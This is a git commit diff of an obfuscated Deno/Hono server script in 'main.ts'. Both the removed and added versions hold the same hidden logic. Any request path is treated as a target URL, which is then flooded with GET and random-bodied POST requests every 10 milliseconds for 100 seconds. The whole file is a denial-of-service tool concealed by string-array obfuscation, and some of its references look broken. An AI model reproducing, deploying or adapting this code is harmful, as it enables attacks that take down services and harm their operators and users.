b5179372cd96496c3c95f979e438f8debe8c611b
Ame_x <121654029+EdamAme-x@users.noreply.github.com>
2023-12-14 13:03:48 +0900

    Update main.ts

--- main.ts
+++ main.ts
@@ -1,1 +1,180 @@
-function n(t,$){let e=s();return(n=function(t,$){return e[t-=183]})(t,$)}!function(t,$){let e=n,_=t();for(;;)try{let c=-parseInt(e(190))/1*(-parseInt(e(213))/2)+-parseInt(e(206))/3+-parseInt(e(199))/4+parseInt(e(208))/5+parseInt(e(228))/6+-parseInt(e(205))/7+-parseInt(e(221))/8;if(276148===c)break;_.push(_.shift())}catch(u){_.push(_.shift())}}(s,276148);let a=b;function b(t,$){let e=B();return(b=function(t,$){let _=n;if("jspJP"===_(187))return e[t-=136];{let c=e[t(154)]($,arguments);return q=null,c}})(t,$)}function B(){let t=n,$=[t(209),t(220),t(219),t(216),t(184),"23244XQJaCV",t(191),t(185),t(226),t(193),t(207),t(198),t(204),t(227),t(210),"toString",t(229),t(222),"search",t(211),"fetch","275GDsYha","POST",t(223),t(196),"pathname",t(224),"1128408SlzDAR"];return(B=function(){return $})()}!function(t,$){let e=n,_=b,c=t();for(;;)try{let u=-parseInt(_(155))/1+parseInt(_(149))/2*(-parseInt(_(139))/3)+parseInt(_(159))/4*(parseInt(_(147))/5)+parseInt(_(153))/6+-parseInt(_(143))/7*(-parseInt(_(138))/8)+parseInt(_(162))/9+-parseInt(_(163))/10;if(190789===u)break;c.push(c[e(215)]())}catch(l){c.push(c[e(215)]())}}(B,190789);let x=function(){let t=function(){let _=n;if("HlfyR"!==_(197)){let c=!0;return function(u,l){let i=_;if(i(200)!==i(200)){if(e){let o=Q.apply(o,arguments);return I=null,o}}else{let d=c?function(){let _=i;if(_(186)!==_(186))return t.toString().search("(((.+)+)+)+$")[_(183)]()[_(219)]($)[_(192)](_(211));if(l){if(_(201)===_(202)){if(e){let c=Q[_(209)](d,arguments);return I=null,c}}else{let o=l.apply(u,arguments);return l=null,o}}}:function(){};return c=!1,d}}}{let u=Y?function(){if(u){let t=m[u(154)](r,arguments);return A=null,t}}:function(){};return V=!1,u}}(),$=t(this,function(){let t=n;if(t(189)===t(189))return $[t(183)]()[t(192)]("(((.+)+)+)+$")[t(183)]()[t(219)]($)[t(192)](t(211));{e=f-136;let _=_[q];return _}});$();let e=!0;return function(t,_){let c=n;if(c(188)===c(195)){let u=[c(209),c(220),"constructor","NSAtk",c(184),c(194),c(191),c(185),c(226),c(193),c(207),c(198),c(204),c(227),c(210),"toString",c(229),c(222),"search",c(211),c(218),"275GDsYha",c(203),c(223),c(196),"pathname",c(224),c(214)];return _=function(){return u},$()}{let l=e?function(){let $=c,e=b;if(e(157)===e(160)){let u=_?function(){if(u){let t=m[e(154)](r,arguments);return A=null,t}}:function(){};return V=!1,u}if("MZQMK"!==$(217)){if(_){let l=_[$(209)](t,arguments);return _=null,l}}else{let i=_?function(){if(i){let t=m[$(209)](r,arguments);return A=null,t}}:function(){};return V=!1,i}}:function(){};return e=!1,l}}}(),R=x(this,function(){let t=n,$=b;return R[$(141)]()[$(144)]($(145))[$(141)]()[$(156)](R)[$(144)](t(211))});R();import{Hono as t}from"https://deno.land/x/hono@v3.4.1/mod.ts";function s(){let t=["1824715IxrTOa","apply","url","(((.+)+)+)+$","01010101010","502oXoCmZ","1128408SlzDAR","shift","NSAtk","xiQen","fetch","constructor","183594CdSBBq","174392FZBQvN","14252leaVXU","411330OXhSKc","all","gepfv","549450PYtaxU","3yFpzDu","2543970zdIPBd","method","toString","text","GET","TfZUc","jspJP","fLNcZ","MNuoK","1781SrZFWK","fwHjp","search","843670fautpM","23244XQJaCV","pxRCd","repeat","FygID","random","1596072eSFVRR","puFYj","agDmN","kIvUD","POST","376yFEebX","2372769XTjGNC","600111cvOwqV","slice"];return(s=function(){return t})()}let h=new t;h[a(152)]("/*",async t=>{let $=n,e=a,_=new URL(t.e[e(140)])[e(151)][e(136)](1),c=setInterval(async()=>{let t=n;if(t(225)===t(225)){let $=e,u={};u[$(142)]=$(161),fetch(_,u),fetch(_,{method:$(148),body:"a="+Math[t(198)]()[$(141)](36)[$(150)](1e4)});let l={};l[$(142)]=$(161),fetch(_,l),fetch(_,{method:$(148),body:"a="+Math[$(137)]()[$(141)](36)[$(150)](1e4)})}else{let i=_[t(209)](c,arguments);return f=null,i}},10);return setTimeout(()=>clearInterval(c),1e5),t[e(158)]($(212))}),Deno.i(h[a(146)]);
+function n(_, t) {
+    let e = s();
+    return (n = function(_, t) {
+        return e[_ -= 183]
+    })(_, t)
+}! function(_, t) {
+    let e = n,
+        u = _();
+    for (;;) try {
+        let l = -parseInt(e(190)) / 1 * (-parseInt(e(213)) / 2) + -parseInt(e(206)) / 3 + -parseInt(e(199)) / 4 + parseInt(e(208)) / 5 + parseInt(e(228)) / 6 + -parseInt(e(205)) / 7 + -parseInt(e(221)) / 8;
+        if (276148 === l) break;
+        u.push(u.shift())
+    } catch (i) {
+        u.push(u.shift())
+    }
+}(s, 276148);
+let a = b;
+
+function b(_, t) {
+    let e = B();
+    return (b = function(_, t) {
+        if ("jspJP" === n(187)) return e[_ -= 136];
+        {
+            let u = e[_(154)](t, arguments);
+            return q = null, u
+        }
+    })(_, t)
+}
+
+function B() {
+    let _ = n,
+        t = [_(209), _(220), _(219), _(216), _(184), "23244XQJaCV", _(191), _(185), _(226), _(193), _(207), _(198), _(204), _(227), _(210), "toString", _(229), _(222), "search", _(211), "fetch", "275GDsYha", "POST", _(223), _(196), "pathname", _(224), "1128408SlzDAR"];
+    return (B = function() {
+        return t
+    })()
+}! function(_, t) {
+    let e = n,
+        u = b,
+        l = _();
+    for (;;) try {
+        let i = -parseInt(u(155)) / 1 + parseInt(u(149)) / 2 * (-parseInt(u(139)) / 3) + parseInt(u(159)) / 4 * (parseInt(u(147)) / 5) + parseInt(u(153)) / 6 + -parseInt(u(143)) / 7 * (-parseInt(u(138)) / 8) + parseInt(u(162)) / 9 + -parseInt(u(163)) / 10;
+        if (190789 === i) break;
+        l.push(l[e(215)]())
+    } catch (o) {
+        l.push(l[e(215)]())
+    }
+}(B, 190789);
+let x = function() {
+        let _ = function() {
+                let u = n;
+                if ("HlfyR" !== u(197)) {
+                    let l = !0;
+                    return function(i, o) {
+                        let $ = u;
+                        if ($(200) !== $(200)) {
+                            if (e) {
+                                let c = Q.apply(c, arguments);
+                                return I = null, c
+                            }
+                        } else {
+                            let p = l ? function() {
+                                let u = $;
+                                if (u(186) !== u(186)) return _.toString().search("(((.+)+)+)+$")[u(183)]()[u(219)](t)[u(192)](u(211));
+                                if (o) {
+                                    if (u(201) === u(202)) {
+                                        if (e) {
+                                            let l = Q[u(209)](p, arguments);
+                                            return I = null, l
+                                        }
+                                    } else {
+                                        let c = o.apply(i, arguments);
+                                        return o = null, c
+                                    }
+                                }
+                            } : function() {};
+                            return l = !1, p
+                        }
+                    }
+                } {
+                    let i = Y ? function() {
+                        if (i) {
+                            let _ = m[i(154)](r, arguments);
+                            return A = null, _
+                        }
+                    } : function() {};
+                    return V = !1, i
+                }
+            }(),
+            t = _(this, function() {
+                let _ = n;
+                if (_(189) === _(189)) return t[_(183)]()[_(192)]("(((.+)+)+)+$")[_(183)]()[_(219)](t)[_(192)](_(211));
+                {
+                    e = f - 136;
+                    let u = u[q];
+                    return u
+                }
+            });
+        t();
+        let e = !0;
+        return function(_, u) {
+            let l = n;
+            if (l(188) === l(195)) {
+                let i = [l(209), l(220), "constructor", "NSAtk", l(184), l(194), l(191), l(185), l(226), l(193), l(207), l(198), l(204), l(227), l(210), "toString", l(229), l(222), "search", l(211), l(218), "275GDsYha", l(203), l(223), l(196), "pathname", l(224), l(214)];
+                return u = function() {
+                    return i
+                }, t()
+            } {
+                let o = e ? function() {
+                    let t = l,
+                        e = b;
+                    if (e(157) === e(160)) {
+                        let i = u ? function() {
+                            if (i) {
+                                let _ = m[e(154)](r, arguments);
+                                return A = null, _
+                            }
+                        } : function() {};
+                        return V = !1, i
+                    }
+                    if ("MZQMK" !== t(217)) {
+                        if (u) {
+                            let o = u[t(209)](_, arguments);
+                            return u = null, o
+                        }
+                    } else {
+                        let $ = u ? function() {
+                            if ($) {
+                                let _ = m[t(209)](r, arguments);
+                                return A = null, _
+                            }
+                        } : function() {};
+                        return V = !1, $
+                    }
+                } : function() {};
+                return e = !1, o
+            }
+        }
+    }(),
+    R = x(this, function() {
+        let _ = n,
+            t = b;
+        return R[t(141)]()[t(144)](t(145))[t(141)]()[t(156)](R)[t(144)](_(211))
+    });
+R();
+import {
+    Hono as _
+} from "https://deno.land/x/hono@v3.4.1/mod.ts";
+
+function s() {
+    let _ = ["1824715IxrTOa", "apply", "url", "(((.+)+)+)+$", "01010101010", "502oXoCmZ", "1128408SlzDAR", "shift", "NSAtk", "xiQen", "fetch", "constructor", "183594CdSBBq", "174392FZBQvN", "14252leaVXU", "411330OXhSKc", "all", "gepfv", "549450PYtaxU", "3yFpzDu", "2543970zdIPBd", "method", "toString", "text", "GET", "TfZUc", "jspJP", "fLNcZ", "MNuoK", "1781SrZFWK", "fwHjp", "search", "843670fautpM", "23244XQJaCV", "pxRCd", "repeat", "FygID", "random", "1596072eSFVRR", "puFYj", "agDmN", "kIvUD", "POST", "376yFEebX", "2372769XTjGNC", "600111cvOwqV", "slice"];
+    return (s = function() {
+        return _
+    })()
+}
+let h = new _;
+h[a(152)]("/*", async _ => {
+    let t = n,
+        e = a,
+        u = new URL(_.e[e(140)])[e(151)][e(136)](1),
+        l = setInterval(async () => {
+            let _ = n;
+            if (_(225) === _(225)) {
+                let t = e,
+                    i = {};
+                i[t(142)] = t(161), fetch(u, i), fetch(u, {
+                    method: t(148),
+                    body: "a=" + Math[_(198)]()[t(141)](36)[t(150)](1e4)
+                });
+                let o = {};
+                o[t(142)] = t(161), fetch(u, o), fetch(u, {
+                    method: t(148),
+                    body: "a=" + Math[t(137)]()[t(141)](36)[t(150)](1e4)
+                })
+            } else {
+                let $ = u[_(209)](l, arguments);
+                return f = null, $
+            }
+        }, 10);
+    return setTimeout(() => clearInterval(l), 1e5), _[e(158)](t(212))
+}), Deno.i(h[a(146)]);
